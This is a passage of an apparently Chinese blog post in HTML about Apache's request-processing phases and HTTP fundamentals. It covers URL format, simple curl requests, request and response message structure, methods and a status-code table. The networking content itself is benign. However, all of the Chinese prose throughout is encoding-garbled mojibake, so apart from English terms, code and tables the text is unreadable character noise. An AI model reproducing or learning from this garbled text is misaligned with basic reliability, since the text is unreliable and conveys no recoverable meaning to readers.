Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šæŒ‰ç…§é…ç½®æ–‡ä»¶è®¾å®šçš„ç­–ç•¥å¯¹ç”¨æˆ·è¿›è¡Œè®¤è¯ï¼Œå¹¶è®¾å®šç”¨æˆ·ååŒºåŸŸã€‚æ¨¡å—å¯ä»¥åœ¨è¿™é˜¶æ®µæ’å…¥é’©å­ï¼Œå®ç°ä¸€ä¸ªè®¤è¯æ–¹æ³•ã€‚</p><p>6ã€Authorizationé˜¶æ®µ : Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šæ ¹æ®é…ç½®æ–‡ä»¶æ£€æŸ¥æ˜¯å¦å…è®¸è®¤è¯è¿‡çš„ç”¨æˆ·æ‰§è¡Œè¯·æ±‚çš„æ“ä½œã€‚æ¨¡å—å¯ä»¥åœ¨è¿™é˜¶æ®µæ’å…¥é’©å­ï¼Œå®ç°ä¸€ä¸ªç”¨æˆ·æƒé™ç®¡ç†çš„æ–¹æ³•ã€‚</p><p>7ã€MIME Type Checkingé˜¶æ®µ : Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šæ ¹æ®è¯·æ±‚èµ„æºçš„MIMEç±»å‹çš„ç›¸å…³è§„åˆ™ï¼Œåˆ¤å®šå°†è¦ä½¿ç”¨çš„å†…å®¹å¤„ç†å‡½æ•°ã€‚æ ‡å‡†æ¨¡å—mod_negotiationå’Œmod_mimeå®ç°äº†è¿™ä¸ªé’©å­ã€‚</p><p>8ã€FixUpé˜¶æ®µ : è¿™æ˜¯ä¸€ä¸ªé€šç”¨çš„é˜¶æ®µï¼Œå…è®¸æ¨¡å—åœ¨å†…å®¹ç”Ÿæˆå™¨ä¹‹å‰ï¼Œè¿è¡Œä»»ä½•å¿…è¦çš„å¤„ç†æµç¨‹ã€‚å’ŒPost_Read_Requestç±»ä¼¼ï¼Œè¿™æ˜¯ä¸€ä¸ªèƒ½å¤Ÿæ•è·ä»»ä½•ä¿¡æ¯çš„é’©å­ï¼Œä¹Ÿæ˜¯æœ€å¸¸ä½¿ç”¨çš„é’©å­ã€‚</p><p>9ã€Responseé˜¶æ®µ : Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šç”Ÿæˆè¿”å›å®¢æˆ·ç«¯çš„å†…å®¹ï¼Œè´Ÿè´£ç»™å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªæ°å½“çš„å›å¤ã€‚è¿™ä¸ªé˜¶æ®µæ˜¯æ•´ä¸ªå¤„ç†æµç¨‹çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚</p><p>10ã€Loggingé˜¶æ®µ : Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šåœ¨å›å¤å·²ç»å‘é€ç»™å®¢æˆ·ç«¯ä¹‹åè®°å½•äº‹åŠ¡ã€‚æ¨¡å—å¯èƒ½ä¿®æ”¹æˆ–è€…æ›¿æ¢Apacheçš„æ ‡å‡†æ—¥å¿—è®°å½•ã€‚</p><p>11ã€CleanUpé˜¶æ®µ : Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šæ¸…ç†æœ¬æ¬¡è¯·æ±‚äº‹åŠ¡å¤„ç†å®Œæˆä¹‹åé—ç•™çš„ç¯å¢ƒï¼Œæ¯”å¦‚æ–‡ä»¶ã€ç›®å½•çš„å¤„ç†æˆ–è€…Socketçš„å…³é—­ç­‰ç­‰ï¼Œè¿™æ˜¯Apacheä¸€æ¬¡è¯·æ±‚å¤„ç†çš„æœ€åä¸€ä¸ªé˜¶æ®µã€‚</p><h1 id="HTTPåè®®"><a href="#HTTPåè®®" class="headerlink" title="HTTPåè®®"></a>HTTPåè®®</h1><p>HTTP ï¼ˆHyperText Transfer Protocalï¼Œè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰ æ˜¯åº”ç”¨å±‚åè®®ï¼Œä½¿ç”¨ TCP åè®®è¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œå¸¸ç”¨ç«¯å£å·ä¸º 80ï¼Œç”¨äºå®ç° Web å®¢æˆ·ç«¯ å’Œ Web æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ã€‚HTTP åè®®è§„å®šäº†å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´é€šä¿¡çš„æŠ¥æ–‡æ ¼å¼ä»¥åŠæ•°æ®äº¤æ¢çš„æµç¨‹ã€‚</p><p>HTTPæ˜¯ä¸€ç§æ— çŠ¶æ€åè®®ï¼Œä¸WEBæµè§ˆå™¨ä¹‹é—´ä¸ä¼šå»ºç«‹æ°¸ä¹…è¿æ¥ï¼›å½“æœåŠ¡å™¨è¿”å›å“åº”åï¼Œå°±ä¼šå…³é—­ä¸æœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥ï¼Œåªæœ‰åœ¨é‡æ–°å‘èµ·è¯·æ±‚çš„æ—¶å€™æ‰ä¼šé‡æ–°å»ºç«‹è¿æ¥ï¼ˆæœåŠ¡å™¨ä¸ä¸»åŠ¨è¿æ¥ï¼Œè¿æ¥ç”±å®¢æˆ·ç«¯å‘èµ·ï¼‰</p><p>è®¡ç®—æœºä¸»è¦é€šè¿‡æµè§ˆå™¨çš„URLè¿›è¡ŒHTTPè¯·æ±‚å‘é€ã€‚</p><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>URL(Uniform Resource Locator),å³ç»Ÿä¸€èµ„æºå®šä½ç¬¦,æ˜¯ä¸“ä¸ºæ ‡è¯†Internetç½‘ä¸Šèµ„æºä½ç½®è€Œè®¾ç½®çš„ä¸€ç§ç¼–å€æ–¹å¼ï¼Œæˆ‘ä»¬å¹³æ—¶æ‰€è¯´çš„ç½‘é¡µåœ°å€æŒ‡çš„å³æ˜¯URLã€‚äº’è”ç½‘ä¸Šçš„æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„URLï¼Œå®ƒåŒ…å«çš„ä¿¡æ¯æŒ‡å‡ºæ–‡ä»¶çš„ä½ç½®ä»¥åŠæµè§ˆå™¨åº”è¯¥æ€ä¹ˆå¤„ç†å®ƒã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åè®®:&#x2F;&#x2F;ç”¨æˆ·å:å¯†ç @å­åŸŸå.åŸŸå.é¡¶çº§åŸŸåï¼ˆæœåŠ¡å™¨IPï¼‰:ç«¯å£å·&#x2F;ç›®å½•&#x2F;æ–‡ä»¶å.æ–‡ä»¶åç¼€?å‚æ•°&#x3D;å€¼</span><br></pre></td></tr></table></figure><p>åœ¨linuxä¸­å¯ä»¥ä½¿ç”¨<code>curl</code>å‘½ä»¤å‘é€HTTPè¯·æ±‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#è®¿é—®HTTPå“åº”æ•°æ®</span><br><span class="line">curl http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201221225142635.png" alt="image-20201221225142635"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#å›æ˜¾HTTPå“åº”å¤´éƒ¨æ•°æ®</span><br><span class="line">curl http:&#x2F;&#x2F;www.baidu.com -I</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201221225334555.png" alt="image-20201221225334555"></p><p>ä»<code>curl</code>å‘½ä»¤çš„ç»“æœï¼Œå¯ä»¥è®¤ä¸ºæµè§ˆå™¨çš„ä½œç”¨æ˜¯æ¸²æŸ“HTTPå“åº”ä¿¡æ¯åŒ…</p><h2 id="HTTPåè®®çš„ç»“æ„"><a href="#HTTPåè®®çš„ç»“æ„" class="headerlink" title="HTTPåè®®çš„ç»“æ„"></a>HTTPåè®®çš„ç»“æ„</h2><p>HTTPæŠ¥æ–‡ç”±å®¢æˆ·æœºåˆ°æœåŠ¡å™¨çš„è¯·æ±‚å’Œä»æœåŠ¡å™¨åˆ°å®¢æˆ·æœºçš„ç›¸åº”æ„æˆã€‚</p><h3 id="â‘ -è¯·æ±‚æŠ¥æ–‡çš„ç»„æˆï¼š"><a href="#â‘ -è¯·æ±‚æŠ¥æ–‡çš„ç»„æˆï¼š" class="headerlink" title="â‘  è¯·æ±‚æŠ¥æ–‡çš„ç»„æˆï¼š"></a>â‘  è¯·æ±‚æŠ¥æ–‡çš„ç»„æˆï¼š</h3><p><strong>è¯·æ±‚è¡Œ + ä¿¡æ¯å¤´ + è¯·æ±‚å¤´ + å®ä½“å¤´ + æŠ¥æ–‡ä¸»ä½“</strong></p><p>è¯·æ±‚è¡Œçš„æ ¼å¼å¦‚ä¸‹ï¼š</p><p><strong>Method [åˆ†éš”ç¬¦] Request - URL [åˆ†éš”ç¬¦] HTTP-Version CRLF</strong></p><p>è§£é‡Šè¯´æ˜ï¼š</p><p>ï¼ˆ1ï¼‰Method è¡¨ç¤ºå®ŒæˆRequest - URLçš„æ–¹æ³•ï¼Œè¯¥å­—æ®µæ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œæ®<a href="http://dl.dbank.com/c05bnl6946">RFC2616</a>æ ‡å‡†ï¼ˆç°è¡Œçš„HTTP/1.1ï¼‰å¾—çŸ¥ï¼Œé€šå¸¸æœ‰ä»¥ä¸‹8ç§æ–¹æ³•ï¼š</p><table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">HEAD</td><td align="left">HEADæ–¹æ³•è·ŸGETæ–¹æ³•ç›¸åŒï¼Œåªä¸è¿‡æœåŠ¡å™¨å“åº”æ—¶ä¸ä¼šè¿”å›æ¶ˆæ¯ä½“</td></tr><tr><td align="left">PUT</td><td align="left">æŠŠæ¶ˆæ¯æœ¬ä½“ä¸­çš„æ¶ˆæ¯å‘é€åˆ°ä¸€ä¸ªURL,è·ŸPOSTç±»ä¼¼</td></tr><tr><td align="left">TRACE</td><td align="left">æ˜¯ç”¨æ¥è°ƒç”¨ä¸€ä¸ªè¿œç¨‹çš„è¯·æ±‚ä¿¡æ¯åº”ç”¨ç¨‹åºå±‚çš„å¾ªç¯åé€€</td></tr><tr><td align="left">CONNECT</td><td align="left">HTTP/1.1åè®®ä¸­é¢„ç•™ç»™èƒ½å¤Ÿå°†è¿æ¥æ”¹ä¸ºç®¡é“æ–¹å¼çš„ä»£ç†æœåŠ¡å™¨ã€‚</td></tr><tr><td align="left">DELETE</td><td align="left">è¯·æ±‚æœåŠ¡å™¨åˆ é™¤Request-URIæ‰€æ ‡è¯†çš„èµ„æº</td></tr><tr><td align="left">GET</td><td align="left">ç”±å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯è·å–Request-URIæ‰€æ ‡è¯†çš„èµ„æºçš„æ–¹æ³•</td></tr><tr><td align="left">POST</td><td align="left">ç”±å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯æäº¤Request-URIæ‰€æ ‡è¯†çš„èµ„æºåé™„åŠ æ–°çš„æ•°æ®</td></tr><tr><td align="left">OPTIONS</td><td align="left">è¯·æ±‚è·å¾—ç”±Request-URIæ ‡è¯†çš„èµ„æºåœ¨è¯·æ±‚/å“åº”çš„é€šä¿¡è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨çš„åŠŸèƒ½é€‰é¡¹</td></tr></tbody></table><p>ï¼ˆ2ï¼‰[åˆ†éš”ç¬¦]ä¸ºç©ºæ ¼</p><p>ï¼ˆ3ï¼‰Request - URLï¼š éµå¾ªURLæ ¼å¼ï¼Œæ­¤å­—æ®µä¸ºæ˜Ÿå·ï¼ˆ*ï¼‰æ—¶ï¼Œè¯´æ˜è¯·æ±‚å¹¶ä¸ç”¨äºæŸä¸ªç‰¹å®šçš„èµ„æºåœ°å€ï¼Œè€Œæ˜¯ç”¨äºæœåŠ¡æœ¬èº«ã€‚</p><p>ï¼ˆ4ï¼‰HTTP-Versionï¼šè¡¨ç¤ºæ”¯æŒçš„HTTPç‰ˆæœ¬ï¼Œå¦‚HTTP/1.1</p><p>ï¼ˆ5ï¼‰CRLFï¼šè¡¨ç¤ºæ¢è¡Œå›è½¦ç¬¦</p><p><strong>HTTPçš„å¤´</strong>åŒ…æ‹¬é€šç”¨çš„ä¿¡æ¯å¤´ã€è¯·æ±‚å¤´ã€å“åº”å¤´ã€å®ä½“å¤´4éƒ¨åˆ†ï¼Œæ¯ä¸ªå¤´åŸŸç”±ä¸€ä¸ªåŸŸåã€å†’å·å’Œå€¼åŸŸ3éƒ¨åˆ†ç»„æˆã€‚åŸŸåæ˜¯å¤§å°å†™æ— å…³çš„ï¼›åŸŸå€¼å‰å¯ä»¥æ·»åŠ ä»»ä½•æ•°é‡çš„ç©ºæ ¼ï¼Œæ¯ä¸ªHTTPè¯·æ±‚å¯ä»¥åŒ…å«å¤šä¸ªHTTPå¤´åŸŸã€‚</p><p><strong>HTTPæŠ¥æ–‡ä¸»ä½“</strong>åˆ™åŒ…å«äº†HTTPè¯·æ±‚çš„å†…å®¹ï¼Œå¯¹äºgetæ–¹æ³•ï¼ŒæŠ¥æ–‡ä¸»ä½“ä¸ºç©ºï¼Œå¯¹äºpostæ–¹æ³•ï¼ŒæŠ¥æ–‡ä¸»ä½“åˆ™åŒ…å«éœ€è¦å‘é€ç»™æœåŠ¡å™¨çš„æ•°æ®ã€‚</p><h3 id="â‘¡-å“åº”æŠ¥æ–‡çš„ç»„æˆï¼š"><a href="#â‘¡-å“åº”æŠ¥æ–‡çš„ç»„æˆï¼š" class="headerlink" title="â‘¡ å“åº”æŠ¥æ–‡çš„ç»„æˆï¼š"></a>â‘¡ å“åº”æŠ¥æ–‡çš„ç»„æˆï¼š</h3><p><strong>çŠ¶æ€è¡Œ + ä¿¡æ¯å¤´ + å“åº”å¤´ + å®ä½“å¤´ + æŠ¥æ–‡ä¸»ä½“</strong></p><p>è§£é‡Šè¯´æ˜ï¼š</p><p>ï¼ˆ1ï¼‰çŠ¶æ€è¡Œç”±çŠ¶æ€ç å’ŒåŸå› åˆ†æä¸¤éƒ¨åˆ†ç»„æˆï¼Œå…¶ä¸­ï¼ŒçŠ¶æ€ç ç”±3ä½æ•°å­—ç»„æˆï¼Œè¡¨ç¤ºè¯·æ±‚æ˜¯å¦è¢«ç†è§£æˆ–è¢«æ»¡è¶³ï¼Œç”¨æ¥æ”¯æŒè‡ªåŠ¨æ“ä½œï¼›åŸå› åˆ†ææ˜¯å¯¹åŸæ–‡çš„çŠ¶æ€ç ä½œç®€å•çš„æè¿°ï¼Œç”¨äºä¾›ç”¨æˆ·ä½¿ç”¨ã€‚</p><h3 id="â‘¢HTTPçŠ¶æ€ç "><a href="#â‘¢HTTPçŠ¶æ€ç " class="headerlink" title="â‘¢HTTPçŠ¶æ€ç "></a>â‘¢HTTPçŠ¶æ€ç </h3><table><thead><tr><th align="left">åˆ†ç±»</th><th align="left">åˆ†ç±»æè¿°</th></tr></thead><tbody><tr><td align="left">1**</td><td align="left">ä¿¡æ¯ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ï¼Œéœ€è¦è¯·æ±‚è€…ç»§ç»­æ‰§è¡Œæ“ä½œ</td></tr><tr><td align="left">2**</td><td align="left">æˆåŠŸï¼Œæ“ä½œè¢«æˆåŠŸæ¥æ”¶å¹¶å¤„ç†</td></tr><tr><td align="left">3**</td><td align="left">é‡å®šå‘ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„æ“ä½œä»¥å®Œæˆè¯·æ±‚</td></tr><tr><td align="left">4**</td><td align="left">å®¢æˆ·ç«¯é”™è¯¯ï¼Œè¯·æ±‚åŒ…å«è¯­æ³•é”™è¯¯æˆ–æ— æ³•å®Œæˆè¯·æ±‚</td></tr><tr><td align="left">5**</td><td align="left">æœåŠ¡å™¨é”™è¯¯ï¼ŒæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚çš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†é”™è¯¯</td></tr></tbody></table><p><strong>HTTPçŠ¶æ€ç åˆ—è¡¨</strong></p><table><thead><tr><th align="left">çŠ¶æ€ç </th><th align="left">çŠ¶æ€ç è‹±æ–‡åç§°</th><th align="left">ä¸­æ–‡æè¿°</th></tr></thead><tbody><tr><td align="left">100</td><td align="left">Continue</td><td align="left">ç»§ç»­ã€‚å®¢æˆ·ç«¯åº”ç»§ç»­å…¶è¯·æ±‚</td></tr><tr><td align="left">101</td><td align="left">Switching Protocols</td><td align="left">åˆ‡æ¢åè®®ã€‚æœåŠ¡å™¨æ ¹æ®å®¢æˆ·ç«¯çš„è¯·æ±‚åˆ‡æ¢åè®®ã€‚åªèƒ½åˆ‡æ¢åˆ°æ›´é«˜çº§çš„åè®®ï¼Œä¾‹å¦‚ï¼Œåˆ‡æ¢åˆ°HTTPçš„æ–°ç‰ˆæœ¬åè®®</td></tr><tr><td align="left">200</td><td align="left">OK</td><td align="left">è¯·æ±‚æˆåŠŸã€‚ä¸€èˆ¬ç”¨äºGETä¸POSTè¯·æ±‚</td></tr><tr><td align="left">201</td><td align="left">Created</td><td align="left">å·²åˆ›å»ºã€‚æˆåŠŸè¯·æ±‚å¹¶åˆ›å»ºäº†æ–°çš„èµ„æº</td></tr><tr><td align="left">202</td><td align="left">Accepted</td><td align="left">å·²æ¥å—ã€‚å·²ç»æ¥å—è¯·æ±‚ï¼Œä½†æœªå¤„ç†å®Œæˆ</td></tr><tr><td align="left">203</td><td align="left">Non-Authoritative Information</td><td align="left">éæˆæƒä¿¡æ¯ã€‚è¯·æ±‚æˆåŠŸã€‚ä½†è¿”å›çš„metaä¿¡æ¯ä¸åœ¨åŸå§‹çš„æœåŠ¡å™¨ï¼Œè€Œæ˜¯ä¸€ä¸ªå‰¯æœ¬</td></tr><tr><td align="left">204</td><td align="left">No Content</td><td align="left">æ— å†…å®¹ã€‚æœåŠ¡å™¨æˆåŠŸå¤„ç†ï¼Œä½†æœªè¿”å›å†…å®¹ã€‚åœ¨æœªæ›´æ–°ç½‘é¡µçš„æƒ…å†µä¸‹ï¼Œå¯ç¡®ä¿æµè§ˆå™¨ç»§ç»­æ˜¾ç¤ºå½“å‰æ–‡æ¡£</td></tr><tr><td align="left">205</td><td align="left">Reset Content</td><td align="left">é‡ç½®å†…å®¹ã€‚æœåŠ¡å™¨å¤„ç†æˆåŠŸï¼Œç”¨æˆ·ç»ˆç«¯ï¼ˆä¾‹å¦‚ï¼šæµè§ˆå™¨ï¼‰åº”é‡ç½®æ–‡æ¡£è§†å›¾ã€‚å¯é€šè¿‡æ­¤è¿”å›ç æ¸…é™¤æµè§ˆå™¨çš„è¡¨å•åŸŸ</td></tr><tr><td align="left">206</td><td align="left">Partial Content</td><td align="left">éƒ¨åˆ†å†…å®¹ã€‚æœåŠ¡å™¨æˆåŠŸå¤„ç†äº†éƒ¨åˆ†GETè¯·æ±‚</td></tr><tr><td align="left">300</td><td align="left">Multiple Choices</td><td align="left">å¤šç§é€‰æ‹©ã€‚è¯·æ±‚çš„èµ„æºå¯åŒ…æ‹¬å¤šä¸ªä½ç½®ï¼Œç›¸åº”å¯è¿”å›ä¸€ä¸ªèµ„æºç‰¹å¾ä¸åœ°å€çš„åˆ—è¡¨ç”¨äºç”¨æˆ·ç»ˆç«¯ï¼ˆä¾‹å¦‚ï¼šæµè§ˆå™¨ï¼‰é€‰æ‹©</td></tr><tr><td align="left">301</td><td align="left">Moved Permanently</td><td align="left">æ°¸ä¹…ç§»åŠ¨ã€‚è¯·æ±‚çš„èµ„æºå·²è¢«æ°¸ä¹…çš„ç§»åŠ¨åˆ°æ–°URIï¼Œè¿”å›ä¿¡æ¯ä¼šåŒ…æ‹¬æ–°çš„URIï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å®šå‘åˆ°æ–°URIã€‚ä»Šåä»»ä½•æ–°çš„è¯·æ±‚éƒ½åº”ä½¿ç”¨æ–°çš„URIä»£æ›¿</td></tr><tr><td align="left">302</td><td align="left">Found</td><td align="left">ä¸´æ—¶ç§»åŠ¨ã€‚ä¸301ç±»ä¼¼ã€‚ä½†èµ„æºåªæ˜¯ä¸´æ—¶è¢«ç§»åŠ¨ã€‚å®¢æˆ·ç«¯åº”ç»§ç»­ä½¿ç”¨åŸæœ‰URI</td></tr><tr><td align="left">303</td><td align="left">See Other</td><td align="left">æŸ¥çœ‹å…¶å®ƒåœ°å€ã€‚ä¸301ç±»ä¼¼ã€‚ä½¿ç”¨GETå’ŒPOSTè¯·æ±‚æŸ¥çœ‹</td></tr><tr><td align="left">304</td><td align="left">Not Modified</td><td align="left">æœªä¿®æ”¹ã€‚æ‰€è¯·æ±‚çš„èµ„æºæœªä¿®æ”¹ï¼ŒæœåŠ¡å™¨è¿”å›æ­¤çŠ¶æ€ç æ—¶ï¼Œä¸ä¼šè¿”å›ä»»ä½•èµ„æºã€‚å®¢æˆ·ç«¯é€šå¸¸ä¼šç¼“å­˜è®¿é—®è¿‡çš„èµ„æºï¼Œé€šè¿‡æä¾›ä¸€ä¸ªå¤´ä¿¡æ¯æŒ‡å‡ºå®¢æˆ·ç«¯å¸Œæœ›åªè¿”å›åœ¨æŒ‡å®šæ—¥æœŸä¹‹åä¿®æ”¹çš„èµ„æº</td></tr><tr><td align="left">305</td><td align="left">Use Proxy</td><td align="left">ä½¿ç”¨ä»£ç†ã€‚æ‰€è¯·æ±‚çš„èµ„æºå¿…é¡»é€šè¿‡ä»£ç†è®¿é—®</td></tr><tr><td align="left">306</td><td align="left">Unused</td><td align="left">å·²ç»è¢«åºŸå¼ƒçš„HTTPçŠ¶æ€ç </td></tr><tr><td align="left">307</td><td align="left">Temporary Redirect</td><td align="left">ä¸´æ—¶é‡å®šå‘ã€‚ä¸302ç±»ä¼¼ã€‚ä½¿ç”¨GETè¯·æ±‚é‡å®šå‘</td></tr><tr><td align="left">400</td><td align="left">Bad Request</td><td align="left">å®¢æˆ·ç«¯è¯·æ±‚çš„è¯­æ³•é”™è¯¯ï¼ŒæœåŠ¡å™¨æ— æ³•ç†è§£</td></tr><tr><td align="left">401</td><td align="left">Unauthorized</td><td align="left">è¯·æ±‚è¦æ±‚ç”¨æˆ·çš„èº«ä»½è®¤è¯</td></tr><tr><td align="left">402</td><td align="left">Payment Required</td><td align="left">ä¿ç•™ï¼Œå°†æ¥ä½¿ç”¨</td></tr><tr><td align="left">403</td><td align="left">Forbidden</td><td align="left">æœåŠ¡å™¨ç†è§£è¯·æ±‚å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œä½†æ˜¯æ‹’ç»æ‰§è¡Œæ­¤è¯·æ±‚</td></tr><tr><td align="left">404</td><td align="left">Not Found</td><td align="left">æœåŠ¡å™¨æ— æ³•æ ¹æ®å®¢æˆ·ç«¯çš„è¯·æ±‚æ‰¾åˆ°èµ„æºï¼ˆç½‘é¡µï¼‰ã€‚é€šè¿‡æ­¤ä»£ç ï¼Œç½‘ç«™è®¾è®¡äººå‘˜å¯è®¾ç½®â€æ‚¨æ‰€è¯·æ±‚çš„èµ„æºæ— æ³•æ‰¾åˆ°â€çš„ä¸ªæ€§é¡µé¢</td></tr><tr><td align="left">405</td><td align="left">Method Not Allowed</td><td align="left">å®¢æˆ·ç«¯è¯·æ±‚ä¸­çš„æ–¹æ³•è¢«ç¦æ­¢</td></tr><tr><td align="left">406</td><td align="left">Not Acceptable</td><td align="left">æœåŠ¡å™¨æ— æ³•æ ¹æ®å®¢æˆ·ç«¯è¯·æ±‚çš„å†…å®¹ç‰¹æ€§å®Œæˆè¯·æ±‚</td></tr><tr><td align="left">407</td><td align="left">Proxy Authentication Required</td><td align="left">è¯·æ±‚è¦æ±‚ä»£ç†çš„èº«ä»½è®¤è¯ï¼Œä¸401ç±»ä¼¼ï¼Œä½†è¯·æ±‚è€…åº”å½“ä½¿ç”¨ä»£ç†è¿›è¡Œæˆæƒ</td></tr><tr><td align="left">408</td><td align="left">Request Time-out</td><td align="left">æœåŠ¡å™¨ç­‰å¾…å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚æ—¶é—´è¿‡é•¿ï¼Œè¶…æ—¶</td></tr><tr><td align="left">409</td><td align="left">Conflict</td><td align="left">æœåŠ¡å™¨å®Œæˆå®¢æˆ·ç«¯çš„ PUT è¯·æ±‚æ—¶å¯èƒ½è¿”å›æ­¤ä»£ç ï¼ŒæœåŠ¡å™¨å¤„ç†è¯·æ±‚æ—¶å‘ç”Ÿäº†å†²çª</td></tr><tr><td align="left">410</td><td align="left">Gone</td><td align="left">å®¢æˆ·ç«¯è¯·æ±‚çš„èµ„æºå·²ç»ä¸å­˜åœ¨ã€‚410ä¸åŒäº404ï¼Œå¦‚æœèµ„æºä»¥å‰æœ‰ç°åœ¨è¢«æ°¸ä¹…åˆ é™¤äº†å¯ä½¿ç”¨410ä»£ç ï¼Œç½‘ç«™è®¾è®¡äººå‘˜å¯é€šè¿‡301ä»£ç æŒ‡å®šèµ„æºçš„æ–°ä½ç½®</td></tr><tr><td align="left">411</td><td align="left">Length Required</td><td align="left">æœåŠ¡å™¨æ— æ³•å¤„ç†å®¢æˆ·ç«¯å‘é€çš„ä¸å¸¦Content-Lengthçš„è¯·æ±‚ä¿¡æ¯</td></tr><tr><td align="left">412</td><td align="left">Precondition Failed</td><td align="left">å®¢æˆ·ç«¯è¯·æ±‚ä¿¡æ¯çš„å…ˆå†³æ¡ä»¶é”™è¯¯</td></tr><tr><td align="left">413</td><td align="left">Request Entity Too Large</td><td align="left">ç”±äºè¯·æ±‚çš„å®ä½“è¿‡å¤§ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†ï¼Œå› æ­¤æ‹’ç»è¯·æ±‚ã€‚ä¸ºé˜²æ­¢å®¢æˆ·ç«¯çš„è¿ç»­è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šå…³é—­è¿æ¥ã€‚å¦‚æœåªæ˜¯æœåŠ¡å™¨æš‚æ—¶æ— æ³•å¤„ç†ï¼Œåˆ™ä¼šåŒ…å«ä¸€ä¸ªRetry-Afterçš„å“åº”ä¿¡æ¯</td></tr><tr><td align="left">414</td><td align="left">Request-URI Too Large</td><td align="left">è¯·æ±‚çš„URIè¿‡é•¿ï¼ˆURIé€šå¸¸ä¸ºç½‘å€ï¼‰ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†</td></tr><tr><td align="left">415</td><td align="left">Unsupported Media Type</td><td align="left">æœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚é™„å¸¦çš„åª’ä½“æ ¼å¼</td></tr><tr><td align="left">416</td><td align="left">Requested range not satisfiable</td><td align="left">å®¢æˆ·ç«¯è¯·æ±‚çš„èŒƒå›´æ— æ•ˆ</td></tr><tr><td align="left">417</td><td align="left">Expectation Failed</td><td align="left">æœåŠ¡å™¨æ— æ³•æ»¡è¶³Expectçš„è¯·æ±‚å¤´ä¿¡æ¯</td></tr><tr><td align="left">500</td><td align="left">Internal Server Error</td><td align="left">æœåŠ¡å™¨å†…éƒ¨é”™è¯¯ï¼Œæ— æ³•å®Œæˆè¯·æ±‚</td></tr><tr><td align="left">501</td><td align="left">Not Implemented</td><td align="left">æœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚çš„åŠŸèƒ½ï¼Œæ— æ³•å®Œæˆè¯·æ±‚</td></tr><tr><td align="left">502</td><td align="left">Bad Gateway</td><td align="left">ä½œä¸ºç½‘å…³æˆ–è€…ä»£ç†å·¥ä½œçš„æœåŠ¡å™¨å°è¯•æ‰§è¡Œè¯·æ±‚æ—¶ï¼Œä»è¿œç¨‹æœåŠ¡å™¨æ¥æ”¶åˆ°äº†ä¸€ä¸ªæ— æ•ˆçš„å“åº”</td></tr><tr><td align="left">503</td><td align="left">Service Unavailable</td><td align="left">ç”±äºè¶…è½½æˆ–ç³»ç»Ÿç»´æŠ¤ï¼ŒæœåŠ¡å™¨æš‚æ—¶çš„æ— æ³•å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚å»¶æ—¶çš„é•¿åº¦å¯åŒ…å«åœ¨æœåŠ¡å™¨çš„Retry-Afterå¤´ä¿¡æ¯ä¸­</td></tr><tr><td align="left">504</td><td align="left">Gateway Time-out</td><td align="left">å……å½“ç½‘å…³æˆ–ä»£ç†çš„æœåŠ¡å™¨ï¼ŒæœªåŠæ—¶ä»è¿œç«¯æœåŠ¡å™¨è·å–è¯·æ±‚</td></tr><tr><td align="left">505</td><td align="left">HTTP Version not supported</td><td align="left">æœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚çš„HTTPåè®®çš„ç‰ˆæœ¬ï¼Œæ— æ³•å®Œæˆå¤„ç†</td></tr></tbody></table><h2 id="å®ä¾‹è¯´æ˜"><a href="#å®ä¾‹è¯´æ˜" class="headerlink" title="å®ä¾‹è¯´æ˜"></a>å®ä¾‹è¯´æ˜</h2><p>æ— 